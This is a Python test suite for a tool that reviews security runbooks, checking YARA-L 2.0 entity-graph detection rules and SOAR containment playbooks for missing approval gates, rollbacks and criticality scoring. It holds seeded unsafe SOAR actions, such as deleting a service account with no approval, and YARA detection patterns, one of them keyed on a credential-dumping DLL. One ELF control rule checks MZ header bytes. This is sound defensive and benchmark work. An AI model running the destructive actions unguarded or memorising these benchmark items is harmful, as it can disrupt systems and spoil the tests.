        '$g.metadata.entity_type = "ASSET"\n'
        "    $e.principal.hostname = $g.entity.hostname"
    )
    assert unprefixed[0]["insert_text"] == (
        '$g.graph.metadata.entity_type = "ASSET"\n'
        "    $e.principal.hostname = $g.graph.entity.hostname"
    )
    assert "$g.graph.entity.hostname" in unprefixed[0]["remediated_rule_text"]

  def test_detects_missing_entity_graph_metadata_type_filter(self):
    from manager.tools.docs_review_tools import (
        inspect_yaral2_entity_graph_and_criticality_in_text,
    )

    doc_text = (
        "# Runbook: Workspace Admin Context Join\n\n"
        "```yaral\n"
        "rule workspace_admin_missing_entity_type {\n"
        "  meta:\n"
        '    author = "Detection Engineering"\n'
        '    severity = "HIGH"\n'
        "  events:\n"
        '    $e.metadata.event_type = "USER_LOGIN"\n'
        "    $e.target.user.email_addresses = $g.graph.entity.user.email_addresses\n"
        "  match:\n"
        "    $e.target.user.email_addresses over 5m\n"
        "  outcome:\n"
        "    $risk_score = max(85)\n"
        "  condition:\n"
        "    $e and $g\n"
        "}\n"
        "```\n"
    )
    res = inspect_yaral2_entity_graph_and_criticality_in_text(doc_text)
    assert res["status"] == "success"
    missing_type = [
        f
        for f in res["findings"]
        if f["defect_type"] == "missing_entity_graph_metadata_type_filter"
    ]
    assert len(missing_type) == 1
    assert missing_type[0]["inferred_entity_type"] == "USER"
    assert (
        '$g.graph.metadata.entity_type = "USER"'
        in missing_type[0]["insert_text"]
    )

  def test_detects_entity_graph_udm_join_key_mismatch(self):
    from manager.tools.docs_review_tools import (
        inspect_yaral2_entity_graph_and_criticality_in_text,
    )

    doc_text = (
        "# Runbook: Cross-Type Entity Graph Join Defect\n\n"
        "```yaral\n"
        "rule cross_type_join_defect {\n"
        "  meta:\n"
        '    author = "Detection Engineering"\n'
        '    severity = "HIGH"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $g.graph.metadata.entity_type = "ASSET"\n'
        "    $e.principal.hostname = $g.graph.entity.user.userid\n"
        "    $e.principal.user.userid = $g.graph.entity.hostname\n"
        "  match:\n"
        "    $e.principal.hostname over 5m\n"
        "  outcome:\n"
        "    $risk_score = max(85)\n"
        "  condition:\n"
        "    $e and $g\n"
        "}\n"
        "```\n"
    )
    res = inspect_yaral2_entity_graph_and_criticality_in_text(doc_text)
    assert res["status"] == "success"
    mismatches = [
        f
        for f in res["findings"]
        if f["defect_type"] == "entity_graph_udm_join_key_mismatch"
    ]
    assert len(mismatches) == 2
    replacements = [m["insert_text"] for m in mismatches]
    assert "$e.principal.hostname = $g.graph.entity.hostname" in replacements
    assert (
        "$e.principal.user.userid = $g.graph.entity.user.userid" in replacements
    )

  def test_detects_uncalibrated_entity_criticality_risk_multiplier(self):
    from manager.tools.docs_review_tools import (
        inspect_yaral2_entity_graph_and_criticality_in_text,
    )

    doc_text = (
        "# Runbook: Production Cloud SQL & Critical Workstation Risk Scoring\n\n"
        "```yaral\n"
        "rule prod_customers_low_risk_score {\n"
        "  meta:\n"
        '    author = "Detection Engineering"\n'
        '    severity = "LOW"\n'
        "  events:\n"
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.target.resource.name = "projects/base-production/instances/prod-customers"\n'
        '    $g.graph.metadata.entity_type = "ASSET"\n'
        "    $e.target.resource.name = $g.graph.entity.resource.name\n"
        '    $g.graph.entity.asset.attribute.cloud.environment = "PRODUCTION"\n'
        "  match:\n"
        "    $e.target.resource.name over 5m\n"
        "  outcome:\n"
        "    $risk_score = max(20)\n"
        "  condition:\n"
        "    $e and $g\n"
        "}\n"
        "```\n"
    )
    res = inspect_yaral2_entity_graph_and_criticality_in_text(doc_text)
    assert res["status"] == "success"
    uncal = [
        f
        for f in res["findings"]
        if f["defect_type"] == "uncalibrated_entity_criticality_risk_multiplier"
    ]
    assert len(uncal) == 1
    assert uncal[0]["observed_risk_score"] == 20
    assert uncal[0]["recommended_min_risk_score"] >= 85
    assert (
        '$risk_score = max(if($g.graph.entity.asset.attribute.cloud.environment = "PRODUCTION", 85, 50))'
        == uncal[0]["insert_text"]
    )
    assert "33278" in uncal[0]["case_ids"]

  def test_detects_prose_entity_criticality_contradiction(self):
    from manager.tools.docs_review_tools import (
        inspect_yaral2_entity_graph_and_criticality_in_text,
    )

    doc_text = (
        "# Incident Triage Postmortem\n\n"
        "Because `projects/base-production` (`prod-customers`), workstation `wins-d19`, "
        "and Workspace identity `admin@mydomain.com` are classified as `LOW` criticality "
        "`DEV_SANDBOX` test-only assets, no priority escalation is required.\n"
    )
    res = inspect_yaral2_entity_graph_and_criticality_in_text(doc_text)
    assert res["status"] == "success"
    prose = [
        f
        for f in res["findings"]
        if f["defect_type"] == "prose_entity_criticality_contradiction"
    ]
    assert len(prose) == 1
    assert "CRITICAL" in prose[0]["insert_text"]
    assert "PRODUCTION" in prose[0]["insert_text"]
    assert "33278" in prose[0]["case_ids"]
    assert "33269" in prose[0]["case_ids"]
    assert "33281" in prose[0]["case_ids"]

  def test_ignores_valid_yaral2_entity_graph_rule_and_standard_file_yara_negative_control(
      self,
  ):
    from manager.tools.docs_review_tools import (
        inspect_yaral2_entity_graph_and_criticality_in_text,
    )

    doc_text = (
        "# Clean Runbook: Valid YARA-L 2.0 Entity Graph & Standard YARA Negative Controls\n\n"
        "```yaral\n"
        "rule valid_wins_d19_entity_graph_context_join {\n"
        "  meta:\n"
        '    author = "Detection Engineering"\n'
        '    severity = "CRITICAL"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    $g.graph.metadata.entity_type = "ASSET"\n'
        "    $e.principal.hostname = $g.graph.entity.hostname\n"
        "  match:\n"
        "    $e.principal.hostname over 5m\n"
        "  outcome:\n"
        '    $risk_score = max(if($g.graph.entity.asset.attribute.cloud.environment = "PRODUCTION", 85, 50))\n'
        "  condition:\n"
        "    $e and $g\n"
        "}\n"
        "```\n\n"
        "```yara\n"
        "rule Malicious_PE_Dropper_File_Signature {\n"
        "  meta:\n"
        '    description = "Standard file/payload YARA rule negative control"\n'
        "  strings:\n"
        '    $mz = "MZ"\n'
        '    $s1 = "comsvcs.dll" ascii wide\n'
        "  condition:\n"
        "    uint16(0) == 0x5A4D and $s1\n"
        "}\n"
        "```\n"
    )
    res = inspect_yaral2_entity_graph_and_criticality_in_text(doc_text)
    assert res["status"] == "success"
    assert res["defect_count"] == 0
    assert res["findings"] == []
    assert res["standard_yara_blocks_skipped"] == 1
    assert res["yaral2_rules_inspected"] == 1

  def test_audit_yaral2_entity_graph_and_criticality_in_doc_dry_run_and_apply_idempotency(
      self,
  ):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        audit_yaral2_entity_graph_and_criticality_in_doc,
    )

    bench12 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-12-YARAL2-ENTITY-GRAPH-AND-CRITICALITY"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-BENCH-12",
        title=bench12["title"],
        initial_text=bench12["seeded_doc_text"],
    )

    # DRY_RUN mode: detects all 5 defects without mutating the document
    res_dry = audit_yaral2_entity_graph_and_criticality_in_doc(
        document_id="SIM-BENCH-12",
        mode="DRY_RUN",
        docs_client_override=sim,
    )
    assert res_dry["status"] == "success"
    assert res_dry["mode"] == "DRY_RUN"
    assert res_dry["defect_count"] == 5
    assert res_dry["applied_redlines"] == 0
    assert res_dry["appended_appendix"] is False

    # APPLY mode Pass 1: applies 5 non-destructive suggested edits and appends H26 appendix
    res_apply1 = audit_yaral2_entity_graph_and_criticality_in_doc(
        document_id="SIM-BENCH-12",
        mode="APPLY",
        append_appendix=True,
        docs_client_override=sim,
    )
    assert res_apply1["status"] == "success"
    assert res_apply1["mode"] == "APPLY"
    assert res_apply1["defect_count"] == 5
    assert res_apply1["applied_redlines"] == 5
    assert res_apply1["appended_appendix"] is True

    updated_text = sim.get_plain_text()
    assert (
        "## [VERIFIED CHRONICLE YARA-L 2.0 ENTITY GRAPH & ASSET/IDENTITY CRITICALITY MATRIX (H26)]"
        in updated_text
    )
    for nc_sub in bench12["negative_control_substrings"]:
      assert nc_sub in updated_text

    # APPLY mode Pass 2: idempotency check (0 new active defects, 5 skipped existing suggestions)
    res_apply2 = audit_yaral2_entity_graph_and_criticality_in_doc(
        document_id="SIM-BENCH-12",
        mode="APPLY",
        append_appendix=True,
        docs_client_override=sim,
    )
    assert res_apply2["status"] == "success"
    assert res_apply2["defect_count"] == 0
    assert res_apply2["skipped_existing_suggestion_count"] == 5
    assert res_apply2["applied_redlines"] == 0
    assert res_apply2["appended_appendix"] is False

  def test_live_chronicle_rule_validation_gate_integration_for_entity_graph_remediation(
      self,
  ):
    from manager.tools.docs_review_tools import (
        ChronicleRuleValidationGate,
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        audit_yaral2_entity_graph_and_criticality_in_doc,
    )

    captured_rules: list[str] = []

    def fake_validator(rule_text: str) -> dict[str, Any]:
      captured_rules.append(rule_text)
      # Verify the compiler-safe entity graph rule contains $g.graph.* and a match: section
      assert "$g.graph.metadata.entity_type" in rule_text
      assert "$g.entity." not in rule_text
      assert "$g.metadata." not in rule_text
      assert "match:" in rule_text
      return {"valid": True, "raw_output": "Rule validation PASSED"}

    gate = ChronicleRuleValidationGate(validate_fn=fake_validator)
    bench12 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-12-YARAL2-ENTITY-GRAPH-AND-CRITICALITY"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-GATE-12",
        title=bench12["title"],
        initial_text=bench12["seeded_doc_text"],
    )
    res = audit_yaral2_entity_graph_and_criticality_in_doc(
        document_id="SIM-GATE-12",
        mode="DRY_RUN",
        validate_live=True,
        validation_gate=gate,
        docs_client_override=sim,
    )
    assert res["status"] == "success"
    assert len(res["live_rule_validations"]) == 4
    assert all(v["valid"] is True for v in res["live_rule_validations"])
    assert len(captured_rules) == 4

  def test_verify_and_annotate_google_doc_includes_h26_entity_graph_and_criticality(
      self,
  ):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        review_google_doc_with_stage_a,
        verify_and_annotate_google_doc,
    )

    bench12 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-12-YARAL2-ENTITY-GRAPH-AND-CRITICALITY"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-VERIFY-H26",
        title=bench12["title"],
        initial_text=bench12["seeded_doc_text"],
    )
    res = verify_and_annotate_google_doc(
        document_id="SIM-VERIFY-H26",
        mode="DRY_RUN",
        check_yaral2_entity_graph_and_criticality=True,
        docs_client_override=sim,
    )
    assert res["status"] == "success"
    assert res["check_yaral2_entity_graph_and_criticality"] is True
    assert "H26" in res["horizons_executed"]
    assert res["total_defect_count"] == 5

    sim_stage_a = LocalGoogleDocsSimulator(
        doc_id="SIM-STAGE-A-B12",
        title=bench12["title"],
        initial_text=bench12["seeded_doc_text"],
    )
    res_stage_a = review_google_doc_with_stage_a(
        "SIM-STAGE-A-B12",
        include_telemetry_hazard_stage_a=False,
        include_credential_containment_stage_a=False,
        include_udm_stage_a=False,
        include_yaral2_stage_a=False,
        include_mitre_cve_stage_a=False,
        include_waved_ontology_stage_a=False,
        include_ioc_reputation_stage_a=False,
        include_skillorchestra_routing_stage_a=False,
        include_skillrl_failure_trajectory_stage_a=False,
        include_yaral2_entity_graph_stage_a=True,
        token_source=lambda: "sim-tok",
        transport=sim_stage_a.as_httpx_transport(),
    )
    assert res_stage_a["status"] == "success"
    assert res_stage_a["stage_a_yaral2_entity_graph_count"] == 5
    assert res_stage_a["edits"]["applied_count"] == 5

  def test_benchmark_suite_bench_12_and_skillrl_h26_distillation(self):
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools.docs_review_tools import (
        evaluate_grounding_benchmark_suite,
        generate_skillrl_failure_distillation_matrix,
    )
    from manager.tools.tools import (
        audit_yaral2_entity_graph_and_criticality_in_doc as audit_tool_fn,
        inspect_yaral2_entity_graph_and_criticality_in_text as inspect_tool_fn,
    )

    res_b12 = evaluate_grounding_benchmark_suite(
        scenario_ids="BENCH-12-YARAL2-ENTITY-GRAPH-AND-CRITICALITY",
        include_hda_ablation=True,
    )
    assert res_b12["status"] == "success"
    assert res_b12["scenario_count"] == 1
    assert res_b12["total_expected_defects"] == 5
    assert res_b12["true_positive_edits"] == 5
    assert res_b12["false_positive_edits"] == 0
    assert res_b12["false_negative_defects"] == 0
    assert res_b12["total_negative_controls"] == 2
    assert res_b12["negative_controls_preserved"] == 2
    assert res_b12["overall_precision"] == 1.0
    assert res_b12["overall_recall"] == 1.0
    assert res_b12["overall_f1"] == 1.0
    assert res_b12["overall_negative_control_pass_rate"] == 1.0
    assert res_b12["pass2_idempotency_rate"] == 1.0
    assert res_b12["google_drive_write_calls"] == 0

    res_all = evaluate_grounding_benchmark_suite(
        scenario_ids="all_with_night2",
        include_hda_ablation=True,
    )
    assert res_all["status"] == "success"
    assert res_all["scenario_count"] >= 12
    assert res_all["total_expected_defects"] >= 63
    assert res_all["true_positive_edits"] == res_all["total_expected_defects"]
    assert res_all["false_positive_edits"] == 0
    assert res_all["false_negative_defects"] == 0
    assert res_all["total_negative_controls"] >= 25
    assert (
        res_all["negative_controls_preserved"]
        == res_all["total_negative_controls"]
    )
    assert res_all["overall_precision"] == 1.0
    assert res_all["overall_recall"] == 1.0
    assert res_all["overall_f1"] == 1.0
    assert res_all["overall_negative_control_pass_rate"] == 1.0
    assert res_all["pass2_idempotency_rate"] == 1.0
    assert res_all["overall_hda_error"] == 0.0
    assert res_all["google_drive_write_calls"] == 0

    matrix = generate_skillrl_failure_distillation_matrix(include_h26=True)
    assert matrix["status"] == "success"
    assert "H26" in matrix["horizons_covered"]
    h26_family = next(
        f for f in matrix["failure_families"] if f["horizon_id"] == "H26"
    )
    assert h26_family["rule_id"] == "SKILLRL-06-YARAL2-ENTITY-GRAPH-CRITICALITY"
    assert len(h26_family["defect_classes_covered"]) == 5

    for fn, expected_name in [
        (
            inspect_tool_fn,
            "inspect_yaral2_entity_graph_and_criticality_in_text",
        ),
        (audit_tool_fn, "audit_yaral2_entity_graph_and_criticality_in_doc"),
    ]:
      ft = FunctionTool(fn)
      decl = ft._get_declaration()
      assert decl is not None
      assert decl.name == expected_name


# ---------------------------------------------------------------------------
# Cycle 26 (Horizon H27): SOAR Playbook Actuation Safety & Blast-Radius
# Pre-Flight Verifier in Google Docs
# ---------------------------------------------------------------------------


class TestCycle26SoarPlaybookActuationSafetyAndPreFlight:
  """Cycle 26 (H27) unit tests for SOAR Playbook Actuation Safety & Blast-Radius Pre-Flight Verifier."""

  def test_detects_unguarded_host_isolation_action_on_critical_asset(self):
    from manager.tools.docs_review_tools import (
        H27_CANONICAL_SOAR_ACTUATION_SAFETY_CATALOG,
        inspect_soar_playbook_actuation_safety_in_text,
    )

    assert H27_CANONICAL_SOAR_ACTUATION_SAFETY_CATALOG["horizon"] == "H27"
    doc_text = (
        "# Host Isolation Playbook\n"
        'Execute SOAR action: `soar.isolate_host(hostname="wins-d19", target_db="prod-customers", auto_execute=True, approval_gate="none")` immediately.\n'
    )
    res = inspect_soar_playbook_actuation_safety_in_text(doc_text)
    assert res["status"] == "success"
    assert res["defect_count"] == 1
    assert res["defect_counts_by_type"]["unguarded_host_isolation_action"] == 1
    finding = res["findings"][0]
    assert finding["defect_type"] == "unguarded_host_isolation_action"
    assert 'soar.isolate_host(hostname="wins-d19"' in finding["quote"]
    assert "SOC Manager (Approval)" in finding["replacement"]
    assert "unisolate_host" in finding["replacement"]
    assert finding["start_index"] >= 1
    assert finding["end_index"] > finding["start_index"]

  def test_detects_unguarded_indicator_block_action_without_rfc_and_empty_sha256_guards(
      self,
  ):
    from manager.tools.docs_review_tools import (
        inspect_soar_playbook_actuation_safety_in_text,
    )

    doc_text = (
        "# Indicator Block Step\n"
        'Execute SOAR action: `soar.block_indicator(indicators=["10.128.0.5", "203.0.113.45", "8.8.8.8", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"], allowlist_check=False)`.\n'
    )
    res = inspect_soar_playbook_actuation_safety_in_text(doc_text)
    assert res["status"] == "success"
    assert res["defect_count"] == 1
    assert (
        res["defect_counts_by_type"]["unguarded_indicator_block_action"] == 1
    )
    finding = res["findings"][0]
    assert finding["defect_type"] == "unguarded_indicator_block_action"
    assert "RFC-1918" in finding["replacement"]
    assert "RFC-5737" in finding["replacement"]
    assert "8.8.8.8" in finding["replacement"]
    assert (
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        in finding["replacement"]
    )
    assert "unblock_indicator" in finding["replacement"]

  def test_detects_unguarded_identity_disable_or_destructive_action_on_superadmin_and_sa(
      self,
  ):
    from manager.tools.docs_review_tools import (
        inspect_soar_playbook_actuation_safety_in_text,
    )

    doc_text = (
        "# Identity Containment Step\n"
        'Execute SOAR action: `soar.delete_service_account(account="serviceAccount:hello@base-production.iam.gserviceaccount.com", target_user="admin@mydomain.com", secondary_user="bruce.wayne@the.org", approval_gate="none")`.\n'
    )
    res = inspect_soar_playbook_actuation_safety_in_text(doc_text)
    assert res["status"] == "success"
    assert res["defect_count"] == 1
    assert (
        res["defect_counts_by_type"][
            "unguarded_identity_disable_or_destructive_action"
        ]
        == 1
    )
    finding = res["findings"][0]
    assert (
        finding["defect_type"]
        == "unguarded_identity_disable_or_destructive_action"
    )
    assert "suspend_user/disable_service_account" in finding["replacement"]
    assert "SOC Manager (Approval)" in finding["replacement"]

  def test_detects_missing_soar_rollback_and_dry_run_contract(self):
    from manager.tools.docs_review_tools import (
        inspect_soar_playbook_actuation_safety_in_text,
    )

    doc_text = (
        "# SOAR Playbook Rollback Contract\n"
        "SOAR Playbook Contract: `soar_containment_policy: {dry_run: false, rollback_plan: none, approval_gate: none, blast_radius_preflight: skipped}`.\n"
    )
    res = inspect_soar_playbook_actuation_safety_in_text(doc_text)
    assert res["status"] == "success"
    assert res["defect_count"] == 1
    assert (
        res["defect_counts_by_type"][
            "missing_soar_rollback_and_dry_run_contract"
        ]
        == 1
    )
    finding = res["findings"][0]
    assert (
        finding["defect_type"] == "missing_soar_rollback_and_dry_run_contract"
    )
    assert "pre_flight_dry_run: true" in finding["replacement"]
    assert "unisolate_host" in finding["replacement"]

  def test_detects_yaral2_unsafe_auto_containment_meta_and_preserves_standard_yara(
      self,
  ):
    from manager.tools.docs_review_tools import (
        inspect_soar_playbook_actuation_safety_in_text,
    )

    doc_text = (
        "rule yaral2_unsafe_soar_auto_isolation_wins_d19 {\n"
        "  meta:\n"
        '    author = "SecOps Detection Engineering"\n'
        '    description = "Triggers SOAR containment on wins-d19 process launch"\n'
        '    severity = "HIGH"\n'
        '    soar_auto_action = "isolate_host_immediate"\n'
        '    soar_approval_gate = "none"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $e.principal.hostname = "wins-d19"\n'
        "  condition:\n"
        "    $e\n"
        "}\n\n"
        "rule standard_yara_elf_binary_control {\n"
        "  meta:\n"
        '    description = "Standard file/payload YARA rule matching ELF header bytes"\n'
        "  strings:\n"
        "    $elf_magic = { 7F 45 4C 46 }\n"
        "  condition:\n"
        "    uint16(0) == 0x5A4D or $elf_magic\n"
        "}\n"
    )
    res = inspect_soar_playbook_actuation_safety_in_text(doc_text)
    assert res["status"] == "success"
    assert res["yaral2_rules_inspected_count"] == 1
    assert res["standard_yara_rules_skipped_count"] == 1
    assert "standard_yara_elf_binary_control" in res["standard_yara_rule_names"]
    assert res["defect_count"] == 1
    assert (
        res["defect_counts_by_type"]["yaral2_unsafe_auto_containment_meta"] == 1
    )
    finding = res["findings"][0]
    assert (
        'soar_auto_action = "stage_pre_flight_containment_with_approval"'
        in finding["remediated_rule"]
    )
    assert (
        'soar_approval_gate = "soc_manager_required"'
        in finding["remediated_rule"]
    )

  def test_preserves_properly_guarded_soar_containment_and_standard_file_yara_negative_controls(
      self,
  ):
    from manager.tools.docs_review_tools import (
        inspect_soar_playbook_actuation_safety_in_text,
    )

    doc_text = (
        "# Valid Guarded SOAR Containment Controls\n"
        'Guarded SOAR Action Control: `soar.stage_containment_plan(hostname="wins-d19", pre_flight_entity_graph_criticality_check=True, allowlist_guard="RFC-1918,RFC-5737,8.8.8.8,1.1.1.1,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", break_glass_superadmin_check=True, non_destructive_action="suspend_user/disable_service_account", pre_flight_dry_run=True, rollback_action="unisolate_host/unblock_indicator/enable_service_account", approval_gate="SOC Manager (Approval)")`.\n\n'
        'Guarded Host Isolation: `soar.isolate_host(hostname="workstation-04", pre_flight_entity_graph_criticality_check=True, auto_execute=False, rollback_action="unisolate_host", approval_gate="SOC Manager (Approval)")`.\n\n'
        'Guarded Indicator Block: `soar.block_indicator(indicators=["185.220.101.34"], allowlist_check=True, allowlist_guard="RFC-1918,RFC-5737,8.8.8.8,1.1.1.1,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", rollback_action="unblock_indicator", approval_gate="SOC Manager (Approval)")`.\n\n'
        "rule valid_yaral2_soar_meta_control {\n"
        "  meta:\n"
        '    author = "SecOps Detection Engineering"\n'
        '    description = "Guarded YARA-L 2.0 SOAR meta rule"\n'
        '    severity = "HIGH"\n'
        '    soar_auto_action = "stage_pre_flight_containment_with_approval"\n'
        '    soar_approval_gate = "soc_manager_required"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        "  condition:\n"
        "    $e\n"
        "}\n\n"
        "rule standard_yara_elf_binary_control {\n"
        "  strings:\n"
        "    $mz = { 4D 5A }\n"
        "  condition:\n"
        "    uint16(0) == 0x5A4D and $mz\n"
        "}\n"
    )
    res = inspect_soar_playbook_actuation_safety_in_text(doc_text)
    assert res["status"] == "success"
    assert res["defect_count"] == 0
    assert res["yaral2_rules_inspected_count"] == 1
    assert res["standard_yara_rules_skipped_count"] == 1

  def test_audit_soar_playbook_actuation_safety_in_doc_dry_run_and_apply_idempotency(
      self,
  ):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        audit_soar_playbook_actuation_safety_in_doc,
        inspect_google_doc_revision_and_Formatting,
    )

    bench13 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-13-SOAR-ACTUATION-SAFETY-AND-PREFLIGHT"
    )
    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-BENCH-13",
        title=bench13["title"],
        initial_text=bench13["markdown_content"],
    )

    res_dry = audit_soar_playbook_actuation_safety_in_doc(
        document_id="SIM-BENCH-13",
        mode="DRY_RUN",
        docs_client_override=sim,
    )
    assert res_dry["status"] == "success"
    assert res_dry["defect_count"] == 5
    assert res_dry["applied_redlines"] == 0

    res_pass1 = audit_soar_playbook_actuation_safety_in_doc(
        document_id="SIM-BENCH-13",
        mode="APPLY",
        append_appendix=True,
        docs_client_override=sim,
    )
    assert res_pass1["status"] == "success"
    assert res_pass1["defect_count"] == 5
    assert res_pass1["applied_redlines"] == 5
    assert res_pass1["appended_appendix"] is True
    assert res_pass1["false_positive_redlines"] == 0

    rev = inspect_google_doc_revision_and_Formatting(
        "SIM-BENCH-13",
        docs_client_override=sim,
    )
    assert rev["applied_redlines"] == 5
    assert rev["false_positive_redlines"] == 0
    assert rev["has_h27_soar_actuation_matrix"] is True

    res_pass2 = audit_soar_playbook_actuation_safety_in_doc(
        document_id="SIM-BENCH-13",
        mode="APPLY",
        append_appendix=True,
        docs_client_override=sim,
    )
    assert res_pass2["status"] == "success"
    assert res_pass2["defect_count"] == 0
    assert res_pass2["applied_redlines"] == 0
    assert res_pass2["skipped_existing_suggestion_count"] == 5
    assert res_pass2["appended_appendix"] is False

  def test_live_chronicle_rule_validation_gate_for_yaral2_soar_meta_remediation(
      self,
  ):
    from manager.tools.docs_review_tools import (
        ChronicleRuleValidationGate,
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        audit_soar_playbook_actuation_safety_in_doc,
    )

    bench13 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-13-SOAR-ACTUATION-SAFETY-AND-PREFLIGHT"
    )
    captured_rules: list[str] = []

    def _mock_validate_rule(rule_text: str):
      captured_rules.append(rule_text)
      return {"valid": True, "success": True}

    gate = ChronicleRuleValidationGate(
        validate_rule_fn=_mock_validate_rule,
        prefer_live=True,
    )
    res = audit_soar_playbook_actuation_safety_in_doc(
        doc_text=bench13["markdown_content"],
        mode="DRY_RUN",
        validate_live=True,
        validation_gate=gate,
    )
    assert res["status"] == "success"
    assert res["compiler_verified"] is True
    assert len(res["rule_validations"]) == 1
    assert res["rule_validations"][0]["valid"] is True
    assert len(captured_rules) == 1
    assert (
        'soar_auto_action = "stage_pre_flight_containment_with_approval"'
        in captured_rules[0]
    )

  def test_verify_and_annotate_google_doc_and_review_stage_a_include_h27_soar_actuation_safety(
      self,
  ):
    from manager.tools.docs_review_tools import (
        EXTENDED_NIGHT2_BENCHMARK_SCENARIOS,
        LocalGoogleDocsSimulator,
        review_google_doc_with_stage_a,
        verify_and_annotate_google_doc,
    )

    bench13 = next(
        s
        for s in EXTENDED_NIGHT2_BENCHMARK_SCENARIOS
        if s["scenario_id"] == "BENCH-13-SOAR-ACTUATION-SAFETY-AND-PREFLIGHT"
    )
    res_verify = verify_and_annotate_google_doc(
        doc_text=bench13["markdown_content"],
        mode="DRY_RUN",
        check_yaral2_entity_graph_and_criticality=False,
        check_soar_playbook_actuation_safety=True,
    )
    assert res_verify["status"] == "success"
    assert "H27" in res_verify["horizons_executed"]
    assert res_verify["total_defect_count"] == 5

    sim = LocalGoogleDocsSimulator(
        doc_id="SIM-STAGE-A-B13",
        title=bench13["title"],
        initial_text=bench13["markdown_content"],
    )
    res_stage_a = review_google_doc_with_stage_a(
        "SIM-STAGE-A-B13",
        include_telemetry_hazard_stage_a=False,
        include_credential_containment_stage_a=False,
        include_udm_stage_a=False,
        include_yaral2_stage_a=False,
        include_mitre_cve_stage_a=False,
        include_waved_ontology_stage_a=False,
        include_ioc_reputation_stage_a=False,
        include_skillorchestra_routing_stage_a=False,
        include_skillrl_failure_trajectory_stage_a=False,
        include_yaral2_entity_graph_stage_a=False,
        include_soar_actuation_safety_stage_a=True,
        token_source=lambda: "sim-tok",
        transport=sim.as_httpx_transport(),
    )
    assert res_stage_a["status"] == "success"
    assert res_stage_a["stage_a_soar_actuation_safety_count"] == 5
    assert res_stage_a["edits"]["applied_count"] == 5

  def test_benchmark_suite_bench_13_and_skillrl_h27_distillation_and_adk_tool_declarations(
      self,
  ):
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools.docs_review_tools import (
        evaluate_grounding_benchmark_suite,
        generate_skillrl_failure_distillation_matrix,
    )
    from manager.tools.tools import (
        audit_soar_playbook_actuation_safety_in_doc as audit_tool_fn,
        inspect_soar_playbook_actuation_safety_in_text as inspect_tool_fn,
    )

    res_b13 = evaluate_grounding_benchmark_suite(
        scenario_ids="BENCH-13-SOAR-ACTUATION-SAFETY-AND-PREFLIGHT",
        include_hda_ablation=True,
    )
    assert res_b13["status"] == "success"
    assert res_b13["scenario_count"] == 1
    assert res_b13["total_expected_defects"] == 5
    assert res_b13["true_positive_edits"] == 5
    assert res_b13["false_positive_edits"] == 0
    assert res_b13["false_negative_defects"] == 0
    assert res_b13["total_negative_controls"] == 2
    assert res_b13["negative_controls_preserved"] == 2
    assert res_b13["overall_precision"] == 1.0
    assert res_b13["overall_recall"] == 1.0
    assert res_b13["overall_f1"] == 1.0
    assert res_b13["overall_negative_control_pass_rate"] == 1.0
    assert res_b13["pass2_idempotency_rate"] == 1.0
    assert res_b13["google_drive_write_calls"] == 0

    res_all = evaluate_grounding_benchmark_suite(
        scenario_ids="all_with_night2",
        include_hda_ablation=True,
    )
    assert res_all["status"] == "success"
    assert res_all["scenario_count"] >= 13
    assert res_all["total_expected_defects"] >= 68
    assert res_all["true_positive_edits"] == res_all["total_expected_defects"]
    assert res_all["false_positive_edits"] == 0
    assert res_all["false_negative_defects"] == 0
    assert res_all["total_negative_controls"] >= 27
    assert res_all["negative_controls_preserved"] == res_all["total_negative_controls"]
    assert res_all["overall_precision"] == 1.0
    assert res_all["overall_recall"] == 1.0
    assert res_all["overall_f1"] == 1.0
    assert res_all["overall_negative_control_pass_rate"] == 1.0
    assert res_all["pass2_idempotency_rate"] == 1.0
    assert res_all["overall_hda_error"] == 0.0
    assert res_all["google_drive_write_calls"] == 0

    matrix = generate_skillrl_failure_distillation_matrix(include_h27=True)
    assert matrix["status"] == "success"
    assert "H27" in matrix["horizons_covered"]
    h27_family = next(
        f for f in matrix["failure_families"] if f["horizon_id"] == "H27"
    )
    assert h27_family["rule_id"] == "SKILLRL-07-SOAR-ACTUATION-PREFLIGHT-SAFETY"
    assert len(h27_family["defect_classes_covered"]) == 5

    for fn, expected_name in [
        (
            inspect_tool_fn,
            "inspect_soar_playbook_actuation_safety_in_text",
        ),
        (audit_tool_fn, "audit_soar_playbook_actuation_safety_in_doc"),
    ]:
      ft = FunctionTool(fn)
      decl = ft._get_declaration()
      assert decl is not None
      assert decl.name == expected_name


